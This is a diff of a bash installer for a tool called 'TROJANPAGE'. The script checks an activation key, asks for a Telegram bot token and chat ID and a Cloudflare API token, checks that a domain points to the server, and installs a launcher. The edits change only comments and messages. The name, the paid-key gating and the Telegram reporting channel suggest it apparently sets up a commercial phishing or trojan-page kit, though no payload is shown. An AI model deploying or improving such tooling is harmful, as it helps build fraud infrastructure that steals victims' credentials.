@@ -1,5 +1,5 @@
 #!/bin/bash
-# 🏛️ TROJANPAGE - CLOUDFLARE & TELEGRAM VALIDATOR (V7.1)
+# 🏛️ TROJANPAGE - SEQUENTIAL VALIDATOR (V7.2)
 # --------------------------------------------------------
 RED='\033[0;31m'
 GREEN='\033[0;32m'
@@ -28,7 +28,7 @@ show_header
 read -p "ENTER ACTIVATION KEY: " USER_INPUT
 [[ $(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]') != "$MASTER_KEY" ]] && { echo -e "${RED}[error] Invalid Key.${NC}"; exit 1; }
 
-# --- 3. TELEGRAM VALIDATION ---
+# --- 3. TELEGRAM VALIDATION (STEP 1) ---
 while true; do
     read -p "Enter Telegram Bot Token: " TG_TOKEN
     echo -ne "[...] Validating Bot Connection..."
@@ -40,11 +40,10 @@ while true; do
 done
 read -p "Enter Telegram Chat ID: " TG_ID
 
-# --- 4. CLOUDFLARE TOKEN VALIDATION ---
+# --- 4. CLOUDFLARE TOKEN VALIDATION (STEP 2) ---
 while true; do
     read -p "Enter Cloudflare API Token: " CF_TOKEN
     echo -ne "[...] Validating Cloudflare Token..."
-    # Verify the token is active and has permissions
     CF_CHECK=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
          -H "Authorization: Bearer $CF_TOKEN" \
          -H "Content-Type:application/json")
@@ -56,7 +55,7 @@ while true; do
     fi
 done
 
-# --- 5. DOMAIN & DNS VALIDATION ---
+# --- 5. DOMAIN & DNS VALIDATION (FINAL STEP) ---
 while true; do
     read -p "Enter Domain (e.g. motarmo.click): " USER_DOMAIN
     USER_DOMAIN=$(echo "$USER_DOMAIN" | tr -d '()[] ')
@@ -71,7 +70,7 @@ while true; do
         echo -e " Domain Points To: ${YELLOW}$CURRENT_DNS${NC}"
         echo -e " VPS IP Address:   ${GREEN}$VPS_IP${NC}"
         echo -e " ------------------------------------------------${NC}"
-        echo -e "${YELLOW}Update Cloudflare A-Record to $VPS_IP (DNS ONLY).${NC}"
+        echo -e "${YELLOW}Update Cloudflare A-Record to $VPS_IP (Grey Cloud/DNS Only).${NC}"
         read -p "Retry DNS check? (y/n): " DNS_RETRY
         [[ "$DNS_RETRY" != "y" ]] && exit 1
     fi
@@ -119,4 +118,4 @@ EOF
 
 chmod +x /root/run.sh
 sudo ln -sf /root/run.sh /usr/local/bin/Run
-echo -e "${GREEN}[success] System Deployed with Verified Cloudflare Token.${NC}"
+echo -e "${GREEN}[success] Full Sequential Deployment Finished.${NC}"
